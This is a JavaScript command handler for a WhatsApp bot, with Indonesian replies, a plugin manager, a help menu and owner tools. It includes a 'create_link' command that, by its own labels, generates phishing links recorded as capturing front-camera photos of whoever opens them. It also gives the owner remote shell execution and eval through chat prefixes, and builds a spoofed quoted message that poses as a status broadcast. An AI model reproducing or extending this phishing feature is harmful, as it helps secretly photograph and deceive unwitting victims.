process.on('uncaughtException', console.error)

require('./config.js')
const fs = require('fs')
const util = require('util')
const path = require('path');
const axios = require('axios')
const moment = require("moment-timezone");
const pluginManager = require('./lib/pluginManager.js');

const {
    exec,
    spawn,
    execSync
} = require("child_process")
const {
    smsg,
    runtime,
    getTime,
    sleep,
    clockString,
    fetchJson,
    getBuffer,
    parseMention,
    getGroupAdmins
} = require('./lib/fungsi.js')
const { v4: uuidv4 } = require('uuid');
const { color } = require('./lib/color.js')

//datase
global.db.data = JSON.parse(fs.readFileSync('./src/database.json'));
if (global.db.data) global.db.data = {
    users: {},
    phising: {},
    ...(global.db.data || {})
};

module.exports = bob = async (bob, m, chatUpdate, store) => {
    try {
        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''

        var budy = (typeof m.text == 'string' ? m.text : '')
        var prefixMatch = global.prefa ? global.prefa.find(p => body.startsWith(p)) : undefined
        var prefix = prefixMatch !== undefined ? prefixMatch : (global.prefa && global.prefa[0] !== undefined ? global.prefa[0] : '!')
        const time = moment(Date.now()).tz('Asia/Makassar').locale('id').format('DD/MM/YY HH:mm:ss z')
        const dt = moment(Date.now()).tz('Asia/Makassar').locale('id').format('a')
        const ucapanWaktu = "Selamat " + dt.charAt(0).toUpperCase() + dt.slice(1) + "👋"
        const isCmd = prefixMatch !== undefined && body.length > 0
        const command = isCmd ? body.slice(prefixMatch.length).trim().split(/ +/).shift().toLowerCase() : body.trim().split(/ +/).shift().toLowerCase()
        const CmD = aliases = body.slice(0).trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const pushname = m.pushName || "No Name"
        const botNumber = await bob.decodeJid(bob.user.id)
        const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const itsMe = m.sender == botNumber ? true : false
        const text = q = args.join(" ")
        const fatkuns = (m.quoted || m)
        const quoted = (fatkuns.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        const isMedia = /image|video|sticker|audio/.test(mime)

        //** Group
        const groupMetadata = m.isGroup ? await bob.groupMetadata(m.chat).catch(e => { }) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
        const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false

        bob.sendFakePreviewImg = async (txt, title_, desc, img_url) => {
            let send = {
                text: txt,
                contexInfo: {
                    externalAdReply: {
                        title: title_,
                        body: desc,
                        thumbnail: await getBuffer(img_url),
                        mediaUrl: img_url,
                        //renderLargerThumbnail: true,
                        //showAdAttribution: false,
                        mediaType: 2
                    }
                }
            }
            await bob.sendMessage(m.chat, send, { quoted: m })
        }


        //** fake reply        
        const fake = {
            key: {
                fromMe: false,
                participant: `0@s.whatsapp.net`,
                ...(m.chat ? {
                    remoteJid: "status@broadcast" //status@broadcast
                } : {})
            },
            message: {
                "extendedTextMessage": {
                    "text": `Di buat dengan Java Script`,
                    "title": `Hmm`,
                    'jpegThumbnail': global.thumb
                }
            }
        }

        //** cmd
        const CmDPlugins = isCmd ? body.slice(prefixMatch.length).trim().split(/ +/).shift().toLowerCase() : null

        // ** plugins
        for (let name in plugins) {
            let plugin = plugins[name];
            if (!plugin) continue;
            let turn = plugin.aliases instanceof Array ?
                plugin.aliases.includes(CmDPlugins) :
                plugin.aliases instanceof String ?
                    plugin.aliases == CmDPlugins :
                    false;
            if (!turn) continue;
            try {
                await plugin.exec(m, {
                    bob,
                    qmsg,
                    budy,
                    quoted,
                    pushname,
                    args,
                    CmD,
                    aliases,
                    text,
                    prefix,
                    command,
                    mime
                });
                pluginManager.handleExecutionSuccess(name);
            } catch (e) {
                console.error(`Error executing plugin ${name}:`, e);
                const res = pluginManager.handleExecutionError(name, e, { command: CmDPlugins });
                if (res.isRealError) {
                    bob.sendText(m.chat, `⚠️ *PLUGIN ERROR TERDETEKSI*\nPlugin *${name}* telah mengalami error 5 kali berturut-turut (${res.errorDetail.errorType}) dan telah dimasukkan ke daftar plugin error.\n\n*Log:* ${res.errorDetail.errorMessage}`, m);
                } else {
                    bob.sendText(m.chat, `Upss... terjadi kesalahan saat menjalankan plugin (${res.failuresCount}/5 kali berturut-turut)\nLog kesalahan:\n${e}`, m);
                }
            }
        }


        // console logs pc        
        if (!m.isGroup && isCmd) console.log(color('├', 'white'), color('NAMA', 'red'), color(pushname, 'yellow'), color('MENGGUNAKAN', 'white'), color('FITUR :', 'red'), color(command, 'lime'), 'args :', color(args.length))

        // console logs gc
        if (isCmd && m.isGroup) console.log(color('├', 'white'), color('NAMA', 'red'), color(pushname, 'yellow'), color('MENGGUNAKAN', 'white'), color('FITUR :', 'red'), color(command, 'lime'), color(`Di Group ${groupName}`, 'yellow'), 'args :', color(args.length))


        switch (command) {


            case 'bob':
            case 'help':
            case 'menu': {
                const stats = pluginManager.getStats();
                const activePlugins = Object.values(plugins);
                const commandsByCategory = {};
                const uncategorizedCommands = [];

                activePlugins.forEach(plugin => {
                    if (!plugin) return;
                    const { CmD, categori } = plugin;
                    if (!CmD || !Array.isArray(CmD)) return;
                    if (!categori) {
                        uncategorizedCommands.push(...CmD);
                        return;
                    }

                    if (!commandsByCategory[categori]) {
                        commandsByCategory[categori] = [];
                    }

                    const commandsWithCategory = CmD.map(cmd => `${cmd}`);
                    commandsByCategory[categori].push(...commandsWithCategory);
                });

                const commandList = [];

                Object.entries(commandsByCategory).forEach(([category, commands]) => {
                    commandList.push(`_list fitur ${category.toLowerCase()}_`);
                    commandList.push(...commands.map(cmd => `  ${prefix + cmd}`));
                    commandList.push('');
                });

                if (uncategorizedCommands.length) {
                    commandList.push(`*NO CATEGORY*`);
                    commandList.push(...uncategorizedCommands.map(cmd => ` ${prefix + cmd}`));
                    commandList.push('');
                }

                const perintah = commandList.join('\n');
                let me = pushname;
                let totag = `Halo @${me.split('@')[0]} ${ucapanWaktu}\nberikut adalah menu yang tersedia!\n\n`;
                let desc = `\n\n_plugin:_ ${stats.activeCount}/${stats.totalPlugins}\n_error:_ ${stats.erroredCount}`;

                bob.sendMessage(m.chat, {
                    text: totag + perintah + desc,
                    mentions: [me]
                }, {
                    quoted: fake
                });
            }
                break

            case 'listerror':
            case 'pluginerror': {
                if (!isCreator) return m.reply(mess.owner);
                const stats = pluginManager.getStats();
                if (stats.erroredCount === 0) {
                    return m.reply(`✅ *Tidak ada plugin yang error!* Semua ${stats.activeCount} plugin berjalan normal.`);
                }
                let msg = `⚠️ *DAFTAR PLUGIN ERROR (${stats.erroredCount}/${stats.totalPlugins})*\n\n`;
                Object.values(stats.erroredPlugins).forEach((item, index) => {
                    msg += `${index + 1}. *${item.filename}*\n`;
                    msg += `   • Tipe: _${item.errorType}_\n`;
                    msg += `   • Waktu: _${item.lastErrorTime}_\n`;
                    msg += `   • Pesan: ${item.errorMessage}\n\n`;
                });
                msg += `Gunakan *${prefix}logerror <nama_file>* untuk melihat detail stack trace.\nGunakan *${prefix}getcode <nama_file>* untuk melihat isi kode.`;
                m.reply(msg);
            }
                break;

            case 'logerror': {
                if (!isCreator) return m.reply(mess.owner);
                if (!text) return m.reply(`Gunakan: ${prefix + command} <nama_file.js>`);
                const filename = text.trim().endsWith('.js') ? text.trim() : text.trim() + '.js';
                const errorInfo = global.pluginErrors[filename];
                if (!errorInfo) return m.reply(`Plugin *${filename}* tidak ditemukan di daftar error.`);
                let msg = `🔍 *DETAIL ERROR PLUGIN: ${filename}*\n\n`;
                msg += `*Tipe:* ${errorInfo.errorType}\n`;
                msg += `*Waktu:* ${errorInfo.lastErrorTime}\n`;
                msg += `*Pesan:* ${errorInfo.errorMessage}\n\n`;
                msg += `*Stack Trace:*\n\`\`\`${errorInfo.stackTrace}\`\`\``;
                m.reply(msg);
            }
                break;

            case 'getcode': {
                if (!isCreator) return m.reply(mess.owner);
                if (!text) return m.reply(`Gunakan: ${prefix + command} <nama_file.js>`);
                const filename = text.trim().endsWith('.js') ? text.trim() : text.trim() + '.js';
                try {
                    const code = pluginManager.getPluginCode(filename);
                    m.reply(`📄 *KODE PLUGIN: ${filename}*\n\n\`\`\`javascript\n${code}\n\`\`\``);
                } catch (e) {
                    m.reply(`❌ ${e.message}`);
                }
            }
                break;

            case 'savecode': {
                if (!isCreator) return m.reply(mess.owner);
                const match = text.match(/^(\S+)\s+([\s\S]+)$/);
                if (!match) return m.reply(`Gunakan: ${prefix + command} <nama_file.js> <kode_baru>`);
                const filename = match[1].endsWith('.js') ? match[1] : match[1] + '.js';
                const newCode = match[2];
                try {
                    const result = pluginManager.savePluginCode(filename, newCode);
                    if (result && result.success) {
                        m.reply(`✅ Plugin *${filename}* berhasil diperbarui dan dimuat kembali!`);
                    } else if (result && result.error) {
                        m.reply(`⚠️ Kode disimpan, namun plugin mengalami error saat dimuat:\n\n*${result.error.errorType}:* ${result.error.errorMessage}`);
                    } else {
                        m.reply(`✅ Plugin *${filename}* berhasil disimpan.`);
                    }
                } catch (e) {
                    m.reply(`❌ Gagal menyimpan plugin: ${e.message}`);
                }
            }
                break;

            case 'retryplugin': {
                if (!isCreator) return m.reply(mess.owner);
                if (!text) return m.reply(`Gunakan: ${prefix + command} <nama_file.js>`);
                const filename = text.trim().endsWith('.js') ? text.trim() : text.trim() + '.js';
                const res = pluginManager.resetPluginError(filename);
                if (res && res.success) {
                    m.reply(`✅ Plugin *${filename}* berhasil dimuat ulang dan aktif kembali!`);
                } else if (res && res.error) {
                    m.reply(`❌ Plugin *${filename}* masih mengalami error:\n${res.error.errorMessage}`);
                } else {
                    m.reply(`⚠️ Gagal mencoba memuat *${filename}*. Periksa keberadaan file.`);
                }
            }
                break;

            case 'runtime':
                console.log(runtime())
                break

            case 'delete': case 'del': {
                if (!m.quoted) throw false
                let { chat, fromMe, id, isBaileys } = m.quoted
                if (!isBaileys) throw 'Pesan tersebut bukan dikirim oleh bot!'
                bob.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
            }
                break


            case 'send': {
                if (!isCreator) return m.reply(mess.owner)
                if (!text) return m.reply('❎')
                await bob.sendFileUrl(m.chat, text, '', m)
            }
                break

            case 'create_link': {
                let url = args[0]
                if (!url) return m.reply(`Sertakan URL tujuan. Contoh: ${prefix}create_link https://google.com`);
                if (!/^https?:\/\//i.test(url)) url = 'http://' + url;
                let id = uuidv4().slice(0, 8);
                global.db.data.phising[id] = {
                    id: id,
                    uid: m.sender,
                    type: 'photo',
                    mode: 'front',
                    url: url
                }
                m.reply(`Link phising berhasil dibuat!\n\nUntuk mengetes di localhost, buka URL ini di browser PC-mu:\nhttp://localhost:8080/${id}`);
            }
                break

            default:

                if (body.startsWith('=>')) {
                    if (!isCreator) return

                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                        if (sat == undefined) {
                            bang = util.format(sul)
                        }
                        return bob.sendText(m.chat, bang, m)
                    }
                    try {
                        bob.sendText(m.chat, util.format(eval(`(async () => { return ${body.slice(3)} })()`)), m)
                    } catch (e) {
                        bob.sendText(m.chat, String(e), m)
                    }
                }

                if (body.startsWith('>')) {
                    if (!isCreator) return
                    try {
                        let evaled = await eval(text)
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await bob.sendText(m.chat, util.format(evaled), m)
                    } catch (err) {
                        await bob.sendText(m.chat, String(err), m)
                        console.log(err)
                    }
                }

                if (body.startsWith('$')) {
                    if (!isCreator) return m.reply(
                        mess.owner
                    )
                    exec(text, (err, stdout) => {
                        if (err) return bob.sendText(m.chat, `${err}`, m)
                        if (stdout) return bob.sendText(m.chat, stdout, m)
                    })
                }


        }

    } catch (err) {
        bob.sendText(m.chat, util.format(err), m)
        console.log(err)
    }

}

let file = require.resolve(__filename)
fs.watchFile(file, () => {
    fs.unwatchFile(file)
    console.log(`update ${__filename}`)
    delete require.cache[file]
    require(file)
})
